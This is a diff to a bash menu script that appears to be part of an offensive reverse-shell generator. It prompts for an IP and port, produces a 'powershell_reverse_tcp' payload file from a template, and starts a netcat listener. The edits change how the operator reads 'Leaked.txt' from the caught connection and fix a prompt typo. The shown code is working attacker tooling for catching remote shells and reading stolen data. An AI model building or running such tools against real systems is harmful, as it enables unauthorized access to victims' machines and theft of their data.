@@ -26,14 +26,15 @@ then
 read -p $'\e\n[1;93mEnter The Port: \e[0m' port
 echo""
 printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
-printf "cat Leaked.txt\n" | nc -klp $port
+printf "\e\n[1;32mType\e[0m\e[1;93mcat Leaked.txt \e[0m\n"
+nc -klvp $port
 sleep 1
 
 
 elif [[ $menu == 02 || $menu == 2  ]]
 then
 echo""
-read -p $'\e\n[1;32mEnte The Output Name: \e[0m' ps_tcp
+read -p $'\e\n[1;32mEnter The Output Name: \e[0m' ps_tcp
 read -p $'\e\n[1;32mEnter The IpAdress: \e[0m' ip
 read -p $'\e\n[1;32mEnter The Port: \e[0m' port
 cp script.vs powershell_reverse_tcp.txt
@@ -56,7 +57,8 @@ read -p $'\n\e[1;96m Did You Need To Listen???[Y/N] : \e[0m' Option
 	if [[ $Option == Y || $Option == y ]]
 	then
 	printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
-	printf "cat Leaked.txt\n" | nc -klp $port
+	printf "\e\n[1;32mType\e[0m\e[1;93mcat Leaked.txt \e[0m\n"
+	nc -klvp $port
 	sleep 1
 	elif [[ $Option == N || $Option == n ]]
 	then
